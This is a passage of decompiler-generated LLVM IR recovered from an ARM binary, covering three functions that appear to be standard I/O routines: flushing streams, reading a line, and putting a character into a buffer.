  uselistorder i32 %v1_ea40, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_20a70.294, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ea94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ea68, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_ea28, { 1, 0 }
}

define i32 @function_eae8(i8* %arg1) local_unnamed_addr {
dec_label_pc_eae8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_eae8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_202d4.329 to i32), i32* %r3.global-to-local, align 4
  %v10_eaf0 = icmp eq i8* %arg1, bitcast (i32** @global_var_202d4.329 to i8*)
  store i1 %v10_eaf0, i1* %cpsr_z.global-to-local, align 1
  %.v1_eaf4 = select i1 %v10_eaf0, i32 0, i32 %tmp
  store i32 %.v1_eaf4, i32* %r8.global-to-local, align 4
  %v2_eafc = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_eaf0, label %bb, label %dec_label_pc_eb08

bb:                                               ; preds = %dec_label_pc_eae8
  store i32 %.v1_eaf4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_eb14

dec_label_pc_eb08:                                ; preds = %dec_label_pc_eae8
  %v2_eb08 = icmp eq i32 %.v1_eaf4, 0
  store i1 %v2_eb08, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_eb08, label %dec_label_pc_eb14, label %dec_label_pc_ec60

dec_label_pc_eb14:                                ; preds = %bb, %dec_label_pc_eb08
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  %v1_eb28 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_202f0.287 to i32), i32* %r0.global-to-local, align 4
  %v1_eb38 = call i32 @function_10d4c()
  %v2_eb40 = load i32, i32* @global_var_20a6c.289, align 4
  %v1_eb44 = add i32 %v2_eb40, 1
  store i32 %v1_eb44, i32* %r3.global-to-local, align 4
  store i32 %v1_eb44, i32* @global_var_20a6c.289, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  %v1_eb5c = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  %v1_eb70 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_202d8.326 to i32), i32* %r0.global-to-local, align 4
  %v1_eb7c = call i32 @function_10d4c()
  store i32 ptrtoint (i32** @global_var_202d4.329 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_eb8c = load i32, i32* bitcast (i32** @global_var_202d4.329 to i32*), align 4
  store i32 %v2_eb8c, i32* @r6, align 4
  %v1_eb94 = call i32 @function_10d54()
  store i32 %v1_eb94, i32* %r0.global-to-local, align 4
  store i32 %v2_eafc, i32* @r4, align 4
  %v0_eb9c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_eb9c, i32* @r5, align 4
  %v0_ec50.pr = load i32, i32* @r6, align 4
  %v2_ec5025 = icmp eq i32 %v0_ec50.pr, 0
  store i1 %v2_ec5025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec5025, label %dec_label_pc_ec58, label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_eb14, %.thread11
  %v0_ebc0 = phi i32 [ %v3_ec4c, %.thread11 ], [ %v0_ec50.pr, %dec_label_pc_eb14 ]
  %v1_eba4 = inttoptr i32 %v0_ebc0 to i8*
  %v2_eba4 = load i8, i8* %v1_eba4, align 1
  %v3_eba4 = zext i8 %v2_eba4 to i32
  store i32 %v3_eba4, i32* %r3.global-to-local, align 4
  %v1_eba8 = and i32 %v3_eba4, 64
  %v2_eba8 = icmp eq i32 %v1_eba8, 0
  store i1 %v2_eba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eba8, label %.thread11, label %dec_label_pc_ebb0

dec_label_pc_ebb0:                                ; preds = %dec_label_pc_eba4
  %v2_ebb4 = load i32, i32* @global_var_20308.320, align 4
  store i32 %v2_ebb4, i32* %r3.global-to-local, align 4
  %v7_ebb8 = icmp eq i32 %v2_ebb4, 2
  store i1 %v7_ebb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebb8, label %dec_label_pc_ebec, label %dec_label_pc_ebc0

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ebb0
  %v1_ebc0 = add i32 %v0_ebc0, 56
  store i32 %v1_ebc0, i32* @r4, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  %v1_ebd8 = call i32 @function_10d54()
  %v0_ebdc = load i32, i32* @r4, align 4
  store i32 %v0_ebdc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_ebe8 = call i32 @function_10d4c()
  store i32 %v1_ebe8, i32* %r0.global-to-local, align 4
  %v0_ebec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebb0, %dec_label_pc_ebc0
  %v0_ec00 = phi i32 [ %v0_ebc0, %dec_label_pc_ebb0 ], [ %v0_ebec.pre, %dec_label_pc_ebc0 ]
  %v1_ebec = inttoptr i32 %v0_ec00 to i32*
  %v2_ebec = load i32, i32* %v1_ebec, align 4
  %v0_ebf0 = load i32, i32* %sl.global-to-local, align 4
  %v2_ebf0 = or i32 %v0_ebf0, %v2_ebec
  %v1_ebf4 = xor i32 %v2_ebf0, 320
  store i32 %v1_ebf4, i32* %r3.global-to-local, align 4
  %v1_ebf8 = and i32 %v1_ebf4, 832
  %v2_ebf8 = icmp eq i32 %v1_ebf8, 0
  store i1 %v2_ebf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebf8, label %dec_label_pc_ec00, label %bb39

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebec
  store i32 %v0_ec00, i32* @r0, align 4
  %v0_ec04 = call i32 @function_d8c8()
  store i32 %v0_ec04, i32* %r0.global-to-local, align 4
  %v2_ec08 = icmp eq i32 %v0_ec04, 0
  store i1 %v2_ec08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec08, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_ec00
  %v1_ec0c = load i32, i32* @r6, align 4
  %v2_ec0c = inttoptr i32 %v1_ec0c to i32*
  %v3_ec0c = load i32, i32* %v2_ec0c, align 4
  store i32 %v3_ec0c, i32* %r3.global-to-local, align 4
  %v2_ec10 = add i32 %v1_ec0c, 8
  %v3_ec10 = inttoptr i32 %v2_ec10 to i32*
  %v4_ec10 = load i32, i32* %v3_ec10, align 4
  %v2_ec14 = and i32 %v3_ec0c, -65
  store i32 %v2_ec14, i32* %r3.global-to-local, align 4
  %v4_ec18 = sdiv i32 %v3_ec0c, 256
  store i32 %v4_ec18, i32* %r1.global-to-local, align 4
  %v3_ec1c = add i32 %v1_ec0c, 28
  %v4_ec1c = inttoptr i32 %v3_ec1c to i32*
  store i32 %v4_ec10, i32* %v4_ec1c, align 4
  %v1_ec20 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec20 = trunc i32 %v1_ec20 to i8
  %v3_ec20 = load i32, i32* @r6, align 4
  %v4_ec20 = add i32 %v3_ec20, 1
  %v5_ec20 = inttoptr i32 %v4_ec20 to i8*
  store i8 %v2_ec20, i8* %v5_ec20, align 1
  %v0_ec24.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec24.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_ec24 = load i32, i32* %r3.global-to-local, align 4
  %v2_ec24 = trunc i32 %v1_ec24 to i8
  %v3_ec24 = load i32, i32* @r6, align 4
  %v4_ec24 = inttoptr i32 %v3_ec24 to i8*
  store i8 %v2_ec24, i8* %v4_ec24, align 1
  %v0_ec28.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec28.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ec00, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_ebec, %.thread6, %.thread7
  %v2_ec30 = load i32, i32* @global_var_20308.320, align 4
  store i32 %v2_ec30, i32* %r3.global-to-local, align 4
  %v7_ec34 = icmp eq i32 %v2_ec30, 2
  store i1 %v7_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec34, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_eafc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 68948)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_eba4, %bb40
  %v0_ec4c = load i32, i32* @r6, align 4
  %v1_ec4c = add i32 %v0_ec4c, 32
  %v2_ec4c = inttoptr i32 %v1_ec4c to i32*
  %v3_ec4c = load i32, i32* %v2_ec4c, align 4
  store i32 %v3_ec4c, i32* @r6, align 4
  %v2_ec50 = icmp eq i32 %v3_ec4c, 0
  store i1 %v2_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec50, label %dec_label_pc_ec50.dec_label_pc_ec58_crit_edge, label %dec_label_pc_eba4

dec_label_pc_ec50.dec_label_pc_ec58_crit_edge:    ; preds = %.thread11
  %v0_ec58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec50.dec_label_pc_ec58_crit_edge, %dec_label_pc_eb14
  %v0_ec58 = phi i32 [ %v0_ec58.pre, %dec_label_pc_ec50.dec_label_pc_ec58_crit_edge ], [ %v1_eb94, %dec_label_pc_eb14 ]
  %v1_ec58 = call i32 @function_e9a8(i32 %v0_ec58)
  store i32 %v1_ec58, i32* %r0.global-to-local, align 4
  %v0_ec9c.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_ec60:                                ; preds = %dec_label_pc_eb08
  %v1_ec60 = inttoptr i32 %.v1_eaf4 to i8*
  %v2_ec60 = load i8, i8* %v1_ec60, align 1
  %v3_ec60 = zext i8 %v2_ec60 to i32
  %v1_ec64 = and i32 %v3_ec60, 64
  store i32 %v1_ec64, i32* %r3.global-to-local, align 4
  %v2_ec64 = icmp eq i32 %v1_ec64, 0
  store i1 %v2_ec64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec64, label %bb41, label %dec_label_pc_ec70

bb41:                                             ; preds = %dec_label_pc_ec60
  br label %bb43

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ec60
  %v0_ec70 = call i32 @function_d8c8()
  store i32 %v0_ec70, i32* %r0.global-to-local, align 4
  %v2_ec74 = icmp eq i32 %v0_ec70, 0
  store i1 %v2_ec74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec74, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_ec70
  %v1_ec78 = load i32, i32* %r8.global-to-local, align 4
  %v2_ec78 = inttoptr i32 %v1_ec78 to i32*
  %v3_ec78 = load i32, i32* %v2_ec78, align 4
  store i32 %v3_ec78, i32* %r3.global-to-local, align 4
  %v2_ec7c = add i32 %v1_ec78, 8
  %v3_ec7c = inttoptr i32 %v2_ec7c to i32*
  %v4_ec7c = load i32, i32* %v3_ec7c, align 4
  store i32 %v4_ec7c, i32* %r1.global-to-local, align 4
  %v2_ec80 = and i32 %v3_ec78, -65
  store i32 %v2_ec80, i32* %r3.global-to-local, align 4
  %v4_ec84 = sdiv i32 %v3_ec78, 256
  %v2_ec88 = trunc i32 %v4_ec84 to i8
  %v4_ec88 = add i32 %v1_ec78, 1
  %v5_ec88 = inttoptr i32 %v4_ec88 to i8*
  store i8 %v2_ec88, i8* %v5_ec88, align 1
  %v0_ec8c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec8c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_ec8c = load i32, i32* %r1.global-to-local, align 4
  %v2_ec8c = load i32, i32* %r8.global-to-local, align 4
  %v3_ec8c = add i32 %v2_ec8c, 28
  %v4_ec8c = inttoptr i32 %v3_ec8c to i32*
  store i32 %v1_ec8c, i32* %v4_ec8c, align 4
  %v1_ec90 = load i32, i32* %r3.global-to-local, align 4
  %v2_ec90 = trunc i32 %v1_ec90 to i8
  %v3_ec90 = load i32, i32* %r8.global-to-local, align 4
  %v4_ec90 = inttoptr i32 %v3_ec90 to i8*
  store i8 %v2_ec90, i8* %v4_ec90, align 1
  %v0_ec94.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec94.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_ec70
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_ec58, %.thread20
  %v0_ec9c = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_ec9c.pre, %dec_label_pc_ec58 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_ec9c, i32* %r0.global-to-local, align 4
  store i32 %v3_eae8, i32* @r4, align 4
  ret i32 %v0_ec9c

; uselistorder directives
  uselistorder i32 %v0_ec9c, { 1, 0 }
  uselistorder i32 %v3_ec4c, { 1, 2, 0 }
  uselistorder i32 %v2_eafc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 7, 3, 0, 5, 6, 8, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32 (i32)* @function_e9a8, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_202d4.329 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_20a6c.289, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ebec, { 1, 0 }
  uselistorder label %dec_label_pc_eba4, { 1, 0 }
  uselistorder label %dec_label_pc_eb14, { 1, 0 }
}

define i32 @function_eccc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_eccc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecd0 = icmp eq i32 %arg2, 0
  store i1 %v2_ecd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_ed58, label %dec_label_pc_ed3c.preheader

dec_label_pc_ed3c.preheader:                      ; preds = %dec_label_pc_eccc
  store i32 %tmp, i32* @r4, align 4
  %v1_ed3c15 = add i32 %arg2, -1
  store i32 %v1_ed3c15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_ed3c21 = icmp eq i32 %arg2, 1
  store i1 %v7_ed3c21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed3c21, label %dec_label_pc_ed48, label %dec_label_pc_ece8

dec_label_pc_ece8:                                ; preds = %dec_label_pc_ed3c.preheader, %dec_label_pc_ed3c.backedge
  %v1_ed4024.in = phi i32 [ %v0_ed40.pre, %dec_label_pc_ed3c.backedge ], [ %arg3, %dec_label_pc_ed3c.preheader ]
  %v1_ece8 = add i32 %v1_ed4024.in, 16
  %v2_ece8 = inttoptr i32 %v1_ece8 to i32*
  %v3_ece8 = load i32, i32* %v2_ece8, align 4
  store i32 %v3_ece8, i32* %r2.global-to-local, align 4
  %v1_ecec = add i32 %v1_ed4024.in, 24
  %v2_ecec = inttoptr i32 %v1_ecec to i32*
  %v3_ecec = load i32, i32* %v2_ecec, align 4
  %v3_ecf0 = icmp uge i32 %v3_ece8, %v3_ecec
  store i1 %v3_ecf0, i1* %cpsr_c.global-to-local, align 1
  %v9_ecf0 = icmp eq i32 %v3_ece8, %v3_ecec
  store i1 %v9_ecf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ecf0, label %dec_label_pc_ed10, label %dec_label_pc_ecf8

dec_label_pc_ecf8:                                ; preds = %dec_label_pc_ece8
  %v1_ecf8 = inttoptr i32 %v3_ece8 to i8*
  %v2_ecf8 = load i8, i8* %v1_ecf8, align 1
  %v5_ecf8 = add i32 %v3_ece8, 1
  store i32 %v5_ecf8, i32* %r2.global-to-local, align 4
  %v2_ecfc = load i32, i32* @r4, align 4
  %v3_ecfc = inttoptr i32 %v2_ecfc to i8*
  store i8 %v2_ecf8, i8* %v3_ecfc, align 1
  %v0_ed00 = load i32, i32* @r4, align 4
  %v1_ed00 = inttoptr i32 %v0_ed00 to i8*
  %v2_ed00 = load i8, i8* %v1_ed00, align 1
  %v5_ed00 = add i32 %v0_ed00, 1
  store i32 %v5_ed00, i32* @r4, align 4
  %v2_ed04 = icmp ugt i8 %v2_ed00, 9
  store i1 %v2_ed04, i1* %cpsr_c.global-to-local, align 1
  %v7_ed04 = icmp eq i8 %v2_ed00, 10
  store i1 %v7_ed04, i1* %cpsr_z.global-to-local, align 1
  %v0_ed08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ed08 = load i32, i32* @r5, align 4
  %v2_ed08 = add i32 %v1_ed08, 16
  %v3_ed08 = inttoptr i32 %v2_ed08 to i32*
  store i32 %v0_ed08, i32* %v3_ed08, align 4
  br i1 %v7_ed04, label %dec_label_pc_ed48, label %dec_label_pc_ed3c.backedge

dec_label_pc_ed10:                                ; preds = %dec_label_pc_ece8
  %v1_ed4024 = inttoptr i32 %v1_ed4024.in to i8*
  %v3_ed10 = call i32 @function_12364(i8* %v1_ed4024)
  %v4_ed10 = trunc i32 %v3_ed10 to i8
  %v5_ed14 = icmp eq i8 %v4_ed10, -1
  store i1 %v5_ed14, i1* %cpsr_c.global-to-local, align 1
  %v10_ed14 = icmp eq i32 %v3_ed10, -1
  store i1 %v10_ed14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_ed14, label %dec_label_pc_ed1c, label %dec_label_pc_ed38

dec_label_pc_ed1c:                                ; preds = %dec_label_pc_ed10
  %v0_ed1c = load i32, i32* @r5, align 4
  %v1_ed1c = inttoptr i32 %v0_ed1c to i8*
  %v2_ed1c = load i8, i8* %v1_ed1c, align 1
  %v1_ed20 = and i8 %v2_ed1c, 8
  %v2_ed20 = icmp eq i8 %v1_ed20, 0
  store i1 %v2_ed20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed20, label %dec_label_pc_ed48, label %dec_label_pc_ed58

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed10
  %v3_ed2c = load i32, i32* @r4, align 4
  %v4_ed2c = inttoptr i32 %v3_ed2c to i8*
  store i8 %v4_ed10, i8* %v4_ed2c, align 1
  %v0_ed30 = load i32, i32* @r4, align 4
  %v1_ed30 = inttoptr i32 %v0_ed30 to i8*
  %v2_ed30 = load i8, i8* %v1_ed30, align 1
  %v5_ed30 = add i32 %v0_ed30, 1
  store i32 %v5_ed30, i32* @r4, align 4
  %v2_ed34 = icmp ugt i8 %v2_ed30, 9
  store i1 %v2_ed34, i1* %cpsr_c.global-to-local, align 1
  %v7_ed34 = icmp eq i8 %v2_ed30, 10
  store i1 %v7_ed34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed34, label %dec_label_pc_ed48, label %dec_label_pc_ed3c.backedge

dec_label_pc_ed3c.backedge:                       ; preds = %dec_label_pc_ed38, %dec_label_pc_ecf8
  %v0_ed3c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_ed40.pre = load i32, i32* @r5, align 4
  %v1_ed3c = add i32 %v0_ed3c.pre, -1
  store i32 %v1_ed3c, i32* %r6.global-to-local, align 4
  %v2_ed3c = icmp ne i32 %v0_ed3c.pre, 0
  store i1 %v2_ed3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed3c = icmp eq i32 %v0_ed3c.pre, 1
  store i1 %v7_ed3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed3c, label %dec_label_pc_ed48, label %dec_label_pc_ece8

dec_label_pc_ed48:                                ; preds = %dec_label_pc_ed3c.preheader, %dec_label_pc_ed38, %dec_label_pc_ed3c.backedge, %dec_label_pc_ecf8, %dec_label_pc_ed1c
  %v0_ed48 = load i32, i32* @r4, align 4
  %v1_ed48 = load i32, i32* %r7.global-to-local, align 4
  %v3_ed48 = icmp uge i32 %v0_ed48, %v1_ed48
  store i1 %v3_ed48, i1* %cpsr_c.global-to-local, align 1
  %v9_ed48 = icmp eq i32 %v0_ed48, %v1_ed48
  store i1 %v9_ed48, i1* %cpsr_z.global-to-local, align 1
  %v2_ed4c = xor i1 %v9_ed48, true
  %v3_ed4c = and i1 %v3_ed48, %v2_ed4c
  br i1 %v3_ed4c, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_ed48
  %v7_ed50 = inttoptr i32 %v0_ed48 to i8*
  store i8 0, i8* %v7_ed50, align 1
  %v0_ed54.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_ed54.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ed48, %bb
  %v1_ed54 = phi i1 [ %v1_ed54.pre, %bb ], [ %v9_ed48, %dec_label_pc_ed48 ]
  %v0_ed54 = phi i1 [ %v0_ed54.pre, %bb ], [ %v3_ed48, %dec_label_pc_ed48 ]
  %v2_ed54 = xor i1 %v1_ed54, true
  %v3_ed54 = and i1 %v0_ed54, %v2_ed54
  br i1 %v3_ed54, label %.dec_label_pc_ed5c_crit_edge, label %dec_label_pc_ed58

.dec_label_pc_ed5c_crit_edge:                     ; preds = %.thread7
  %v0_ed5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_ed58:                                ; preds = %dec_label_pc_eccc, %dec_label_pc_ed1c, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_ed5c:                                ; preds = %.dec_label_pc_ed5c_crit_edge, %dec_label_pc_ed58
  %v0_ed5c = phi i32 [ %v0_ed5c.pre, %.dec_label_pc_ed5c_crit_edge ], [ 0, %dec_label_pc_ed58 ]
  ret i32 %v0_ed5c

; uselistorder directives
  uselistorder i1 %v9_ed48, { 1, 0, 2 }
  uselistorder i32 %v1_ed48, { 1, 0 }
  uselistorder i32 %v0_ed48, { 0, 2, 1 }
  uselistorder i32 %v0_ed3c.pre, { 2, 0, 1 }
  uselistorder i1 %v2_ed20, { 1, 0 }
  uselistorder i32 %v3_ece8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_ed4024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder label %dec_label_pc_ed5c, { 1, 0 }
  uselistorder label %dec_label_pc_ed58, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_ed48, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_ece8, { 1, 0 }
}

define i32 @function_ed64(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ed64:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-13 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_ed64 = load i32, i32* @r4, align 4
  store i32 %v3_ed64, i32* %stack_var_-12, align 4
  %v6_ed64 = load i32, i32* @r5, align 4
  %v2_ed68 = add i32 %arg2, 16
  %v3_ed68 = inttoptr i32 %v2_ed68 to i32*
  %v4_ed68 = load i32, i32* %v3_ed68, align 4
  store i32 %v4_ed68, i32* %r2.global-to-local, align 4
  %v2_ed6c = add i32 %arg2, 28
  %v3_ed6c = inttoptr i32 %v2_ed6c to i32*
  %v4_ed6c = load i32, i32* %v3_ed6c, align 4
  store i32 %v4_ed6c, i32* %r3.global-to-local, align 4
  %v3_ed70 = icmp uge i32 %v4_ed68, %v4_ed6c
  store i1 %v3_ed70, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_ed7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ed7c, i32* @r5, align 4
  br i1 %v3_ed70, label %dec_label_pc_ed94, label %.thread

.thread:                                          ; preds = %dec_label_pc_ed64
  %v2_ed80 = urem i32 %v0_ed7c, 256
  store i32 %v2_ed80, i32* %r3.global-to-local, align 4
  %v2_ed84 = trunc i32 %v0_ed7c to i8
  %v4_ed84 = inttoptr i32 %v4_ed68 to i8*
  store i8 %v2_ed84, i8* %v4_ed84, align 1
  %v5_ed84 = load i32, i32* %r2.global-to-local, align 4
  %v6_ed84 = add i32 %v5_ed84, 1
  store i32 %v6_ed84, i32* %r2.global-to-local, align 4
  %v0_ed88.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ed88.pr.pr, label %dec_label_pc_ed94, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_ed88 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_ed88, i32* %r0.global-to-local, align 4
  store i32 %v6_ed84, i32* %v3_ed68, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ed64, %.thread
  %v3_ed94 = load i8, i8* %tmp, align 1
  %v4_ed94 = zext i8 %v3_ed94 to i32
  %v1_ed98 = and i32 %v4_ed94, 192
  store i32 %v1_ed98, i32* %r3.global-to-local, align 4
  %v2_ed9c = icmp eq i32 %v1_ed98, 192
  store i1 %v2_ed9c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_ed9c, label %dec_label_pc_edb8, label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ed94
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_edac = call i32 @function_11878(i8* nonnull %tmp, i32 128)
  store i32 %v4_edac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edb0 = icmp eq i32 %v4_edac, 0
  br i1 %v2_edb0, label %dec_label_pc_edb8, label %dec_label_pc_ee5c

dec_label_pc_edb8:                                ; preds = %dec_label_pc_eda4, %dec_label_pc_ed94
  %v0_edb8 = load i32, i32* @r4, align 4
  %v1_edb8 = add i32 %v0_edb8, 4
  %v2_edb8 = inttoptr i32 %v1_edb8 to i32*
  %v3_edb8 = load i32, i32* %v2_edb8, align 4
  store i32 %v3_edb8, i32* %r3.global-to-local, align 4
  %v2_edbc = icmp ugt i32 %v3_edb8, -3
  store i1 %v2_edbc, i1* %cpsr_c.global-to-local, align 1
  %v7_edbc = icmp eq i32 %v3_edb8, -2
  br i1 %v7_edbc, label %dec_label_pc_ee54, label %dec_label_pc_edc4

dec_label_pc_edc4:                                ; preds = %dec_label_pc_edb8
  %v1_edc4 = add i32 %v0_edb8, 12
  %v2_edc4 = inttoptr i32 %v1_edc4 to i32*
  %v3_edc4 = load i32, i32* %v2_edc4, align 4
  store i32 %v3_edc4, i32* %r2.global-to-local, align 4
